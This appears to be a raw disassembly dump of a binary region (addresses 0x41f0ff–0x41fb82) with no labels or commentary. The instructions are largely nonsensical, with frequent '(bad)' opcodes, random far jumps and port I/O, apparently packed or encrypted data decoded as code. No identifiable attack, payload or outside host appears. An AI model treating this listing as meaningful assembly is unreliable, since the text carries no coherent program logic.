  41f0ff:	xor    al,0xef
  41f101:	(bad)  [ebx-0x69]
  41f104:	repnz imul ebp,DWORD PTR [edx],0xcc18a4c
  41f10b:	in     al,dx
  41f10c:	repnz xchg esi,ebx
  41f10f:	cmc    
  41f110:	pop    edx
  41f111:	inc    esp
  41f112:	cdq    
  41f113:	leave  
  41f114:	xchg   ecx,eax
  41f115:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f116:	mov    BYTE PTR [edx],bh
  41f118:	repnz in al,dx
  41f11a:	dec    eax
  41f11b:	daa    
  41f11c:	popa   
  41f11d:	mov    esp,0x8449ee99
  41f122:	ror    BYTE PTR [ebx],0xef
  41f125:	scas   eax,DWORD PTR es:[edi]
  41f126:	pop    esi
  41f127:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41f129:	rol    BYTE PTR ds:0xfc836c48,cl
  41f12f:	mov    dl,0xad
  41f131:	jg     0x41f0ce
  41f133:	fstp   DWORD PTR [eax+0x59859871]
  41f139:	sub    ecx,eax
  41f13b:	xor    edi,DWORD PTR [esi+0x64]
  41f13e:	ins    BYTE PTR es:[edi],dx
  41f13f:	fwait
  41f140:	dec    esi
  41f141:	xor    al,0x0
	...
  41f1b3:	add    BYTE PTR [ebx-0x1988fe],ch
  41f1b9:	idiv   DWORD PTR [ebx-0x11ecebb1]
  41f1bf:	mov    DWORD PTR [ecx-0x2f],ecx
  41f1c2:	mov    eax,0x14e4a6f
  41f1c7:	add    dh,dh
  41f1c9:	add    BYTE PTR [eax],al
  41f1cb:	add    BYTE PTR [eax+0x4af256c],bh
  41f1d1:	jnp    0x41f1c2
  41f1d3:	enter  0xf5e,0x59
  41f1d7:	cli    
  41f1d8:	mov    WORD PTR [ecx-0x2c7c55fa],cs
  41f1de:	cmp    bh,BYTE PTR [eax+esi*8+0x69]
  41f1e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1e3:	jg     0x41f189
  41f1e5:	sub    dh,0x76
  41f1e8:	push   ebp
  41f1e9:	fst    DWORD PTR ds:0x9339b231
  41f1ef:	and    al,0x9a
  41f1f1:	outs   dx,BYTE PTR ds:[esi]
  41f1f2:	shl    DWORD PTR [ebp-0x176b2212],0xc5
  41f1f9:	and    ecx,DWORD PTR [edi]
  41f1fb:	dec    esi
  41f1fc:	lss    ebp,FWORD PTR [ebx]
  41f1ff:	sub    ebp,edx
  41f201:	sub    eax,0x921a6e76
  41f206:	xor    eax,0x3256a328
  41f20b:	in     eax,0xde
  41f20d:	jmp    0xe59d:0xe1e11a63
  41f214:	and    BYTE PTR [bp+di-0x6d75],bl
  41f219:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f21a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f21b:	pop    esp
  41f21c:	pop    edx
  41f21d:	or     al,ch
  41f21f:	xor    BYTE PTR [esi+ecx*2+0x20],al
  41f223:	sbb    bh,BYTE PTR [ebp+0x603cde9c]
  41f229:	and    DWORD PTR [ecx-0x1c6289b],ebx
  41f22f:	mov    al,0x6c
  41f231:	jne    0x41f1c7
  41f233:	mov    edx,0xa97af6cc
  41f238:	mov    dh,0xc0
  41f23a:	xor    al,0xd1
  41f23c:	sar    esi,1
  41f23e:	test   bh,0xa
  41f241:	or     eax,0xda3785ef
  41f247:	inc    ebx
  41f248:	aas    
  41f249:	dec    esi
  41f24a:	sahf   
  41f24b:	xchg   edi,eax
  41f24c:	loope  0x41f298
  41f24e:	push   edx
  41f24f:	daa    
  41f250:	data16 outs dx,BYTE PTR ds:[esi]
  41f252:	in     eax,0xaa
  41f254:	mov    ecx,0xc1598b90
  41f259:	pusha  
  41f25a:	push   esp
  41f25b:	in     eax,0x33
  41f25d:	call   0x4da67f91
  41f262:	bound  esp,QWORD PTR ds:0x119aca07
  41f268:	pop    ss
  41f269:	stos   DWORD PTR es:[edi],eax
  41f26a:	jmp    0xc004:0x6eb1d2c1
  41f271:	retf   
  41f272:	addr16 mov edx,ss
  41f275:	ret    
  41f276:	jno    0x41f2d5
  41f278:	mov    dh,0x92
  41f27a:	xchg   edx,eax
  41f27b:	adc    esp,DWORD PTR [ebx+0x18ab4e23]
  41f281:	jo     0x41f262
  41f283:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f284:	cwde   
  41f285:	xchg   edx,eax
  41f286:	xlat   BYTE PTR ds:[ebx]
  41f287:	das    
  41f288:	test   al,0xc6
  41f28a:	mov    fs,WORD PTR [esp+0x42490cd1]
  41f291:	jl     0x41f2cb
  41f293:	or     DWORD PTR [eax+0x3f4fd9da],esi
  41f299:	add    DWORD PTR [esi],ebp
  41f29b:	jmp    0x3f6f:0xef0e10ed
  41f2a2:	push   0x1c
  41f2a4:	jecxz  0x41f2e6
  41f2a6:	jmp    0x41f277
  41f2a8:	mov    dh,0xc7
  41f2aa:	cmp    al,0x9a
  41f2ac:	ret    0x1586
  41f2af:	or     edi,0x6821fb66
  41f2b5:	and    esi,DWORD PTR [esi+0x2e]
  41f2b8:	pop    ds
  41f2b9:	sti    
  41f2ba:	dec    eax
  41f2bb:	lock loopne 0x41f265
  41f2be:	clc    
  41f2bf:	pop    esi
  41f2c0:	mov    fs,WORD PTR ds:0x0
	...
  41f332:	add    BYTE PTR [eax],al
  41f334:	mov    DWORD PTR [edx],edx
  41f336:	ja     0x41f357
  41f338:	(bad)  
  41f339:	jg     0x41f324
  41f33b:	xchg   esi,eax
  41f33c:	call   0x1901:0xeb9531a0
  41f343:	call   0xf6:0x14f40
  41f34a:	add    BYTE PTR [eax],al
  41f34c:	rcl    DWORD PTR [esi-0x503977ee],0x3a
  41f353:	aas    
  41f354:	lods   eax,DWORD PTR ds:[esi]
  41f355:	lods   al,BYTE PTR ds:[esi]
  41f356:	jle    0x41f3a5
  41f358:	outs   dx,BYTE PTR ds:[esi]
  41f359:	mov    ecx,0xa01089e0
  41f35e:	mov    fs,WORD PTR [edi-0x2f]
  41f361:	(bad)
  41f366:	loope  0x41f3ac
  41f368:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f369:	ins    DWORD PTR es:[edi],dx
  41f36a:	stos   BYTE PTR es:[edi],al
  41f36b:	fld    TBYTE PTR [edi]
  41f36d:	jne    0x41f344
  41f36f:	push   ebx
  41f370:	js     0x41f359
  41f372:	mov    ecx,0x7992450f
  41f377:	sub    eax,0x9d16dbac
  41f37c:	add    al,0x1e
  41f37e:	jne    0x41f304
  41f380:	push   0xec77601f
  41f385:	mov    DWORD PTR [edi-0x2d],edx
  41f388:	repz xor BYTE PTR [ebx-0x2c0110b5],al
  41f38f:	out    0x7a,eax
  41f391:	pop    ss
  41f392:	xchg   ebx,eax
  41f393:	jnp    0x41f343
  41f395:	fisttp WORD PTR [ebx]
  41f397:	jmp    0x8323:0x1e605714
  41f39e:	mov    BYTE PTR [ebp+edx*4+0x7c1adcf6],al
  41f3a5:	or     BYTE PTR [eax],cl
  41f3a7:	retf   0x4721
  41f3aa:	scas   eax,DWORD PTR es:[edi]
  41f3ab:	push   ebx
  41f3ac:	jno    0x41f40e
  41f3ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f3af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f3b0:	fistp  WORD PTR [ebp+0x61]
  41f3b3:	loop   0x41f3f7
  41f3b5:	fild   DWORD PTR ds:0xf191d963
  41f3bb:	adc    ah,BYTE PTR [ebx+0x47]
  41f3be:	adc    BYTE PTR ds:0xe86eae55,bh
  41f3c4:	sub    eax,0x9212ec7e
  41f3c9:	mov    ds:0x5b5cce84,eax
  41f3ce:	sti    
  41f3cf:	data16 or bh,BYTE PTR [ebx+0x52]
  41f3d3:	imul   eax,DWORD PTR [ecx-0x3f],0x3a349288
  41f3da:	xor    al,0x5e
  41f3dc:	add    ebp,DWORD PTR [esi+0x265b78af]
  41f3e2:	fcmovne st,st(5)
  41f3e4:	in     eax,0x7
  41f3e6:	test   al,0x57
  41f3e8:	pop    ss
  41f3e9:	icebp  
  41f3ea:	fdivr  DWORD PTR [edx-0x5a]
  41f3ed:	(bad)  
  41f3ee:	pop    ecx
  41f3f0:	xchg   esp,eax
  41f3f1:	das    
  41f3f2:	mov    bh,0x61
  41f3f4:	aas    
  41f3f5:	call   0xa398:0x205d1d30
  41f3fc:	in     eax,dx
  41f3fd:	jns    0x41f39e
  41f3ff:	fwait
  41f400:	je     0x41f3cf
  41f402:	and    edi,DWORD PTR [ebx]
  41f404:	rol    DWORD PTR [ecx+ebp*8-0x401a5452],1
  41f40b:	aas    
  41f40c:	sub    al,0x2d
  41f40e:	enter  0xd799,0xce
  41f412:	call   0x1df5:0x46eac1cc
  41f419:	mov    bl,0x7f
  41f41b:	mov    bl,bl
  41f41d:	jns    0x41f464
  41f41f:	cwde   
  41f420:	mov    dl,0xd
  41f422:	data16 std 
  41f424:	cwde   
  41f425:	pop    esi
  41f426:	adc    cl,BYTE PTR [esi+edx*8+0x18]
  41f42a:	push   ebp
  41f42b:	(bad)  
  41f42d:	cmp    DWORD PTR [ecx+0x73],esp
  41f430:	adc    eax,0xccac24c0
  41f435:	cmc    
  41f436:	inc    edx
  41f437:	fucomp st(0)
  41f439:	push   0x5a20a39e
  41f43e:	das    
  41f43f:	imul   edi,DWORD PTR [ebp+0xc],0x0
	...
  41f4b2:	add    BYTE PTR [eax],al
  41f4b4:	and    BYTE PTR [edx-0x35],ch
  41f4b7:	dec    ebx
  41f4b8:	retf   
  41f4b9:	jmp    0x41f45b
  41f4bb:	imul   ebx,DWORD PTR [ebx],0xfffffff6
  41f4be:	xchg   esp,eax
  41f4bf:	aad    0x2a
  41f4c1:	cmp    al,0x5b
  41f4c3:	outs   dx,DWORD PTR ds:[esi]
  41f4c4:	ss push eax
  41f4c6:	add    DWORD PTR [eax],eax
  41f4c8:	test   BYTE PTR [eax],0x0
  41f4cb:	add    al,ah
  41f4cd:	adc    eax,0xc40ad1bf
  41f4d2:	xchg   ebp,eax
  41f4d3:	ret    
  41f4d4:	icebp  
  41f4d5:	pop    ecx
  41f4d6:	or     dl,BYTE PTR [esi]
  41f4d8:	xor    ah,ch
  41f4da:	xor    BYTE PTR [edx],dh
  41f4dc:	sub    BYTE PTR [ecx-0x49],bh
  41f4df:	xchg   edi,eax
  41f4e0:	jne    0x41f54e
  41f4e2:	adc    al,0x86
  41f4e4:	push   eax
  41f4e5:	or     ebp,edi
  41f4e7:	pop    ecx
  41f4e8:	test   BYTE PTR [edi+0x96bfe8b],0xab
  41f4ef:	(bad)  
  41f4f0:	xchg   esp,eax
  41f4f1:	add    ah,bl
  41f4f3:	and    eax,0xdae810f2
  41f4f8:	enter  0xf8f5,0xc1
  41f4fc:	push   ebp
  41f4fd:	inc    edi
  41f4fe:	add    ecx,ebp
  41f500:	xchg   ecx,eax
  41f501:	in     eax,0x95
  41f503:	push   edx
  41f504:	xchg   ebx,eax
  41f505:	mov    al,0xd6
  41f507:	push   edi
  41f508:	jbe    0x41f4cb
  41f50a:	push   edx
  41f50b:	cmp    bh,bl
  41f50d:	les    edx,FWORD PTR [ebx+0x20]
  41f510:	pshufw mm7,mm6,0xc8
  41f514:	fdiv   QWORD PTR [ecx+eiz*4+0x40]
  41f518:	mov    BYTE PTR [edx+0x3c],ch
  41f51b:	popf   
  41f51c:	mov    cl,0x49
  41f51e:	or     DWORD PTR [ebx],ebx
  41f520:	das    
  41f521:	mov    BYTE PTR [edi],bl
  41f523:	popf   
  41f524:	push   0x162f8767
  41f529:	in     eax,dx
  41f52a:	lea    ebp,[esp+esi*1]
  41f52d:	dec    esi
  41f52e:	jne    0x41f4f6
  41f530:	adc    BYTE PTR [edx],0xf4
  41f533:	iret   
  41f534:	mov    al,ds:0x3573adf9
  41f539:	push   edx
  41f53a:	loopne 0x41f534
  41f53c:	(bad)  
  41f53d:	mov    ds:0x44173108,al
  41f542:	leave  
  41f543:	add    BYTE PTR [eax+0x58239ef4],bl
  41f549:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f54a:	mul    ch
  41f54c:	sbb    DWORD PTR [ecx-0x3410e5cf],ebx
  41f552:	pushf  
  41f553:	mul    bl
  41f555:	pushf  
  41f556:	rol    DWORD PTR [eax],1
  41f558:	stos   DWORD PTR es:[edi],eax
  41f559:	mov    dh,0x52
  41f55b:	push   ebx
  41f55c:	xor    bl,dl
  41f55e:	ins    DWORD PTR es:[edi],dx
  41f55f:	cs xchg ebx,eax
  41f561:	pop    ds
  41f562:	mov    esp,0x41bcfebc
  41f567:	retf   
  41f568:	xchg   BYTE PTR [edi],ah
  41f56a:	in     al,dx
  41f56b:	mov    ebp,0x283795
  41f570:	addr16 inc esi
  41f572:	or     DWORD PTR [ebp+0xbc42cbe],ebx
  41f578:	je     0x41f522
  41f57a:	jb     0x41f5e1
  41f57c:	pop    es
  41f57d:	add    DWORD PTR [ebp-0x6ffc77c0],eax
  41f583:	pop    eax
  41f584:	into   
  41f585:	sub    dl,dh
  41f587:	adc    eax,0x4eda44e9
  41f58c:	or     ebp,DWORD PTR [ebx+0x748257a3]
  41f592:	mov    esp,0xfaef18c4
  41f597:	dec    edi
  41f598:	pop    edx
  41f599:	std    
  41f59a:	gs dec ebx
  41f59c:	or     DWORD PTR [esi+0xb],ecx
  41f59f:	add    dh,ch
  41f5a1:	pusha  
  41f5a2:	sub    BYTE PTR ds:0x47639761,dl
  41f5a8:	add    ebx,DWORD PTR [ebx+0x7175fb24]
  41f5ae:	retf   
  41f5af:	and    DWORD PTR [esi+eax*2],esi
  41f5b2:	in     eax,dx
  41f5b3:	dec    edi
  41f5b4:	fsub   QWORD PTR [ecx+edx*2]
  41f5b7:	mov    ebp,0x60139397
  41f5bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f5bd:	sbb    BYTE PTR [edi+eiz*1+0xe35f],0x0
	...
  41f631:	add    BYTE PTR [eax],al
  41f633:	add    ch,al
  41f635:	cwde   
  41f636:	loope  0x41f68d
  41f638:	std    
  41f639:	jge    0x41f630
  41f63b:	cwde   
  41f63c:	and    eax,0xc01e835
  41f641:	dec    ecx
  41f642:	sti    
  41f643:	das    
  41f644:	sub    al,0x51
  41f646:	add    DWORD PTR [eax],eax
  41f648:	test   BYTE PTR [eax],0x0
  41f64b:	add    ah,bl
  41f64d:	rcr    DWORD PTR [ecx+0x6db20ae5],1
  41f653:	pushf  
  41f654:	sahf   
  41f655:	mov    edi,0x326042ac
  41f65a:	dec    ebx
  41f65b:	or     eax,0x6c5deb00
  41f660:	cmp    al,ch
  41f662:	dec    ebx
  41f663:	(bad)  
  41f664:	fdivrp st(5),st
  41f666:	inc    edx
  41f667:	mov    bl,0xd2
  41f669:	sub    eax,0x337b9d9f
  41f66e:	xor    eax,ecx
  41f670:	cdq    
  41f671:	xchg   esi,eax
  41f672:	mov    ebp,ebp
  41f674:	test   DWORD PTR [edi],esi
  41f676:	iret   
  41f677:	jecxz  0x41f66e
  41f679:	cld    
  41f67a:	mov    eax,ds:0x79418024
  41f67f:	add    al,0x88
  41f681:	push   esp
  41f682:	or     cl,BYTE PTR [esi+0x75]
  41f685:	fwait
  41f686:	adc    al,0x5f
  41f688:	push   esp
  41f689:	mov    cl,BYTE PTR ds:0x1c3c5438
  41f68f:	sub    dh,bh
  41f691:	fcom   QWORD PTR [ecx+eiz*4+0x1b]
  41f695:	cmp    BYTE PTR ds:0xdb771ab1,al
  41f69b:	mov    ecx,es
  41f69d:	adc    al,0xd6
  41f69f:	dec    eax
  41f6a0:	mov    cl,0xda
  41f6a2:	(bad)  
  41f6a4:	je     0x41f67d
  41f6a6:	mov    eax,ds:0xfb27e9c9
  41f6ab:	out    dx,al
  41f6ac:	mov    ebp,0x7b4f2b15
  41f6b1:	stc    
  41f6b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6b3:	xchg   DWORD PTR [ebx+0x3],eax
  41f6b6:	cld    
  41f6b7:	test   BYTE PTR [edi],al
  41f6b9:	test   BYTE PTR [eax+0x32],al
  41f6bc:	or     al,0x39
  41f6be:	jp     0x41f6f4
  41f6c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6c1:	push   esi
  41f6c2:	and    esp,eax
  41f6c4:	mov    ebx,0x71a0759b
  41f6c9:	das    
  41f6ca:	mov    dh,0xb1
  41f6cc:	rcr    edi,1
  41f6ce:	dec    esi
  41f6cf:	xchg   esi,eax
  41f6d0:	arpl   bx,cx
  41f6d2:	pop    ss
  41f6d3:	lds    edi,FWORD PTR [edx]
  41f6d5:	inc    esi
  41f6d6:	mov    dl,0xc3
  41f6d8:	stc    
  41f6d9:	xor    DWORD PTR [esi],0x107dbf96
  41f6df:	pusha  
  41f6e0:	mov    cs,WORD PTR [esi+0x23b57a17]
  41f6e6:	pop    esi
  41f6e7:	les    ecx,FWORD PTR [edx+edx*1+0x3]
  41f6eb:	xor    ebx,edi
  41f6ed:	ret    0x3614
  41f6f0:	sbb    eax,0xdd566426
  41f6f5:	adc    eax,DWORD PTR [eax-0x76e36477]
  41f6fb:	jmp    0x4434375e
  41f700:	sbb    al,0xd1
  41f702:	mov    ds:0x9c47a9c3,eax
  41f707:	es loope 0x41f6c1
  41f70a:	xchg   esi,eax
  41f70b:	sub    edx,esi
  41f70d:	retf   0x3393
  41f710:	push   edi
  41f711:	dec    ecx
  41f712:	ins    DWORD PTR es:[edi],dx
  41f713:	in     eax,dx
  41f714:	mov    cl,0x6
  41f716:	ins    DWORD PTR es:[edi],dx
  41f717:	inc    edi
  41f718:	jno    0x41f762
  41f71a:	mov    ds:0x5840f21a,eax
  41f71f:	pop    eax
  41f720:	add    eax,0xd55e4b5b
  41f725:	es std 
  41f727:	fcmovnb st,st(4)
  41f729:	jne    0x41f765
  41f72b:	and    al,0x80
  41f72d:	add    eax,0x8fcda322
  41f732:	stos   BYTE PTR es:[edi],al
  41f733:	sbb    ch,BYTE PTR [ebp+0x6d9d4bca]
  41f739:	push   es
  41f73a:	imul   ecx,DWORD PTR [esi],0x2d
  41f73d:	and    ecx,esp
  41f73f:	jmp    0x0:0x4496
	...
  41f7b2:	add    BYTE PTR [eax],al
  41f7b4:	sub    eax,0x9e5c8a39
  41f7b9:	(bad)  
  41f7ba:	(bad)  
  41f7bb:	jns    0x41f77e
  41f7bd:	clc    
  41f7be:	mov    ah,0x9e
  41f7c0:	pushf  
  41f7c1:	(bad)  
  41f7c3:	out    0x22,al
  41f7c5:	push   edx
  41f7c6:	add    DWORD PTR [eax],eax
  41f7c8:	test   BYTE PTR [eax],0x0
  41f7cb:	add    BYTE PTR [ecx+ecx*4],cl
  41f7ce:	(bad)  
  41f7d0:	push   edi
  41f7d1:	jmp    0x41f793
  41f7d3:	push   esi
  41f7d4:	pushf  
  41f7d5:	cmp    DWORD PTR [ecx],0x40
  41f7d8:	das    
  41f7d9:	(bad)  
  41f7da:	xchg   ebx,eax
  41f7db:	sbb    ebx,DWORD PTR ds:0x86f85fdf
  41f7e1:	mov    edi,0x78e07e96
  41f7e6:	mov    bl,0xbc
  41f7e8:	test   BYTE PTR [esi],al
  41f7ea:	xor    al,BYTE PTR [ebx]
  41f7ec:	push   0xd27ad967
  41f7f1:	inc    ebx
  41f7f2:	mov    dl,0xef
  41f7f4:	in     al,0x49
  41f7f6:	inc    ebp
  41f7f7:	cdq    
  41f7f8:	in     al,0xe1
  41f7fa:	sub    ch,BYTE PTR [ebx]
  41f7fc:	icebp  
  41f7fd:	test   eax,0x8c24cb14
  41f802:	test   al,0x37
  41f804:	inc    edx
  41f805:	push   ss
  41f806:	arpl   WORD PTR [esi+0xe],cx
  41f809:	add    al,0xab
  41f80b:	lock sbb ch,BYTE PTR [edi]
  41f80e:	test   DWORD PTR [ecx+0x42],esp
  41f811:	aad    0x24
  41f813:	ds dec ebp
  41f815:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f816:	je     0x41f887
  41f818:	int3   
  41f819:	cmp    al,ah
  41f81b:	and    al,0xa4
  41f81d:	jno    0x41f7b7
  41f81f:	pop    ss
  41f820:	pop    ss
  41f821:	shr    bl,0x63
  41f824:	and    ch,BYTE PTR [eax-0x54c1189a]
  41f82a:	cdq    
  41f82b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f82c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f82d:	out    0xfa,eax
  41f82f:	xchg   edi,eax
  41f830:	push   ebp
  41f831:	out    dx,al
  41f832:	sbb    ch,BYTE PTR [eax+0x27]
  41f835:	inc    esp
  41f836:	dec    edi
  41f837:	dec    eax
  41f838:	mov    ebx,0x9b83f369
  41f83d:	ins    DWORD PTR es:[edi],dx
  41f83e:	sub    eax,0x5f969d55
  41f843:	push   edi
  41f844:	sub    BYTE PTR [ecx+0x68cb0143],0xf1
  41f84b:	daa    
  41f84c:	ret    
  41f84d:	mov    edx,0xc9cc6462
  41f852:	test   DWORD PTR [edx],0x5f71e040
  41f858:	in     eax,dx
  41f859:	cmp    eax,0x51f59270
  41f85e:	call   0x2b27:0xc3d967e3
  41f865:	xchg   ebx,eax
  41f866:	mov    eax,ds:0xb5aa0fa0
  41f86b:	inc    ecx
  41f86c:	xor    DWORD PTR [ecx-0x24],0x1f
  41f870:	jbe    0x41f857
  41f872:	sub    ah,0xf2
  41f875:	or     esp,DWORD PTR [edi+eax*1+0x265b906d]
  41f87c:	sbb    eax,0xe9d28d9f
  41f881:	push   ebx
  41f882:	ja     0x41f8ec
  41f884:	push   es
  41f885:	outs   dx,BYTE PTR ds:[esi]
  41f886:	jmp    0x208e9466
  41f88b:	inc    edx
  41f88c:	shr    BYTE PTR [edx+ecx*8+0x7b],0x30
  41f891:	jnp    0x41f8f2
  41f893:	dec    edi
  41f894:	lahf   
  41f895:	ds mov cl,0x46
  41f898:	cmc    
  41f899:	nop
  41f89a:	shr    ah,0x1
  41f89d:	lea    ecx,[ebx]
  41f89f:	mov    DWORD PTR [ebp+0x31c095ec],esp
  41f8a5:	mov    bl,dh
  41f8a7:	popa   
  41f8a8:	add    ebx,DWORD PTR [ecx]
  41f8aa:	pop    eax
  41f8ab:	(bad)  
  41f8ad:	mov    BYTE PTR [edx],dh
  41f8af:	shr    DWORD PTR [edx-0x6],0x1a
  41f8b3:	cli    
  41f8b4:	jns    0x41f91f
  41f8b6:	cli    
  41f8b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f8b8:	sbb    eax,0x34cca051
  41f8bd:	xor    al,0x7f
  41f8bf:	sub    BYTE PTR [eax+0x68],0x0
	...
  41f932:	add    BYTE PTR [eax],al
  41f934:	js     0x41f933
  41f936:	ret    0xc766
  41f939:	jg     0x41f937
  41f93b:	(bad)  
  41f93c:	mov    ecx,0x909ffef7
  41f941:	pop    es
  41f942:	and    DWORD PTR [edi+0x15318],ebp
  41f948:	test   BYTE PTR [eax],0x0
  41f94b:	add    BYTE PTR [ebx],bh
  41f94d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f94e:	sub    DWORD PTR [ebx+0x1fc20f37],eax
  41f954:	iret   
  41f955:	lea    ebx,[esi]
  41f957:	mov    edx,DWORD PTR [ecx+0x6942cc6a]
  41f95d:	cs cmp eax,0x5a7d7edf
  41f963:	pop    edi
  41f964:	in     eax,dx
  41f965:	bsr    ebx,DWORD PTR [ebx]
  41f968:	xor    BYTE PTR [edx+eax*2+0x2a0248ca],al
  41f96f:	(bad)  
  41f971:	jmp    0xccd97036
  41f976:	pop    edx
  41f977:	scas   al,BYTE PTR es:[edi]
  41f978:	jmp    0x41f9f1
  41f97a:	cdq    
  41f97b:	sar    eax,cl
  41f97d:	xor    BYTE PTR [eax-0x57daf8e],ch
  41f983:	sti    
  41f984:	pop    ebp
  41f985:	dec    esi
  41f986:	mov    ds:0x9f430b6f,eax
  41f98b:	inc    ebx
  41f98c:	xchg   ebx,eax
  41f98d:	in     eax,0x9c
  41f98f:	dec    edx
  41f990:	or     ch,dh
  41f992:	mov    ah,0x9d
  41f994:	loopne 0x41f9af
  41f996:	fbstp  TBYTE PTR [esi-0x5d]
  41f999:	mov    esi,0x3fd35bfc
  41f99e:	add    ch,BYTE PTR [ecx-0x32af7e68]
  41f9a4:	cld    
  41f9a5:	mov    al,0xc4
  41f9a7:	lds    ecx,FWORD PTR [eax+esi*2+0x6]
  41f9ab:	jmp    0x98d:0xd395af7d
  41f9b2:	or     BYTE PTR [ebx-0x44e8a5f4],dh
  41f9b8:	(bad)  
  41f9b9:	mov    ah,0x35
  41f9bb:	dec    ebp
  41f9bc:	or     BYTE PTR [ebp+edi*1+0x7e7a5069],dl
  41f9c3:	cmp    esi,DWORD PTR [esi+0x7d]
  41f9c6:	test   eax,0x4236c7a1
  41f9cb:	xor    BYTE PTR [ecx],cl
  41f9cd:	out    dx,al
  41f9ce:	mov    ch,0x46
  41f9d0:	mov    DWORD PTR [ebp+ebp*8-0x2d630ca0],esp
  41f9d7:	inc    esp
  41f9d8:	aad    0x1f
  41f9da:	ds retf 0xb316
  41f9de:	test   DWORD PTR [esi-0x1e],edi
  41f9e1:	inc    eax
  41f9e2:	and    eax,0x14199b70
  41f9e7:	sbb    esp,DWORD PTR [edx+0x42bb8500]
  41f9ed:	in     al,dx
  41f9ee:	cdq    
  41f9ef:	jecxz  0x41fa0f
  41f9f1:	out    0x25,eax
  41f9f3:	mov    ah,BYTE PTR [edx+ebx*8-0x2e137982]
  41f9fa:	rol    BYTE PTR [ebx-0x5f],1
  41f9fd:	jp     0x41fa6a
  41f9ff:	jmp    0xe328:0x449dbd85
  41fa06:	call   0x3343:0x947621df
  41fa0d:	or     edi,DWORD PTR [edi]
  41fa0f:	test   eax,0x56c12297
  41fa14:	leave  
  41fa15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa16:	pop    esi
  41fa17:	cmc    
  41fa18:	mov    cl,BYTE PTR [edi]
  41fa1a:	mov    ds:0x15b99c46,al
  41fa1f:	rol    dl,0x2e
  41fa22:	aad    0xe1
  41fa24:	test   DWORD PTR [ecx+0x77],ecx
  41fa27:	out    0x9b,al
  41fa29:	aad    0x60
  41fa2b:	push   edx
  41fa2c:	pop    ds
  41fa2d:	int    0x85
  41fa2f:	call   0xca94e58b
  41fa34:	mov    ebp,0xb057252e
  41fa39:	mov    esi,0x26b50bbe
  41fa3e:	stc    
  41fa3f:	fnstsw WORD PTR [eax]
  41fa41:	ins    DWORD PTR es:[edi],dx
	...
  41fab2:	add    BYTE PTR [eax],al
  41fab4:	adc    ch,BYTE PTR [edi]
  41fab6:	mov    esi,DWORD PTR [edi+edi*4+0x4eaf3fb4]
  41fabd:	cwde   
  41fabe:	out    dx,eax
  41fabf:	daa    
  41fac0:	fs jle 0x41faef
  41fac3:	test   eax,0x1540e
  41fac8:	test   BYTE PTR [eax],0x0
  41facb:	add    BYTE PTR [ebx-0x6efd8a4b],bl
  41fad1:	cli    
  41fad2:	lock fwait
  41fad4:	stc    
  41fad5:	in     eax,dx
  41fad6:	cs adc ah,dl
  41fad9:	jmp    0x6cb26f5c
  41fade:	lea    esp,[ebp-0x42eea573]
  41fae4:	jecxz  0x41fb2b
  41fae6:	(bad)  
  41fae7:	call   FWORD PTR [edi]
  41fae9:	mov    eax,0xde2090b3
  41faef:	out    dx,eax
  41faf0:	inc    ebx
  41faf1:	dec    ecx
  41faf2:	cwd    
  41faf4:	pushf  
  41faf5:	mov    gs,WORD PTR [eax]
  41faf7:	lock aam 0xce
  41fafa:	adc    DWORD PTR [eax],eax
  41fafc:	and    ebx,DWORD PTR [ecx+eax*1-0x8]
  41fb00:	mov    ax,ds:0x1434fecd
  41fb06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb07:	adc    BYTE PTR [ecx],0x86
  41fb0a:	inc    esp
  41fb0b:	mov    edi,0x3bd6127f
  41fb10:	hlt    
  41fb11:	mov    ah,0xe5
  41fb13:	outs   dx,BYTE PTR ds:[esi]
  41fb14:	repnz aas 
  41fb16:	push   esi
  41fb17:	mov    al,0x22
  41fb19:	pop    esi
  41fb1a:	icebp  
  41fb1b:	js     0x41fb81
  41fb1d:	loopne 0x41fb94
  41fb1f:	test   al,0xe4
  41fb21:	adc    al,0x5a
  41fb23:	icebp  
  41fb24:	call   0x34a07ba8
  41fb29:	lea    esp,[edi-0x1503fa01]
  41fb2f:	les    edi,FWORD PTR [edx-0x664e51fd]
  41fb35:	mov    al,0x13
  41fb37:	scas   eax,DWORD PTR es:[edi]
  41fb38:	scas   al,BYTE PTR es:[edi]
  41fb39:	push   esp
  41fb3a:	popf   
  41fb3b:	jnp    0x41fae3
  41fb3d:	test   BYTE PTR [ebp-0x10fb00e],ch
  41fb43:	jmp    DWORD PTR ds:0xe09a2fbb
  41fb49:	popa   
  41fb4a:	xchg   DWORD PTR [eax+eax*2],ecx
  41fb4d:	fsubrp st(6),st
  41fb4f:	xchg   edx,eax
  41fb50:	sahf   
  41fb51:	sar    BYTE PTR [eax+0x42],1
  41fb54:	mov    ds:0x423105a4,al
  41fb59:	dec    eax
  41fb5a:	repnz xor ah,BYTE PTR [ebp-0x52970ad7]
  41fb61:	pop    esp
  41fb62:	pop    ss
  41fb63:	daa    
  41fb64:	or     eax,0xe1b64698
  41fb69:	lock dec ebx
  41fb6b:	das    
  41fb6c:	bound  esi,QWORD PTR [esi+0x1d930b3f]
  41fb72:	jns    0x41fbd3
  41fb74:	cwde   
  41fb75:	out    0x2a,al
  41fb77:	mov    esp,0x1e8d29fe
  41fb7c:	push   0xffffffc6
  41fb7e:	mov    cl,0xb0
  41fb80:	sub    DWORD PTR [edx],ebp
  41fb82:	push   ds
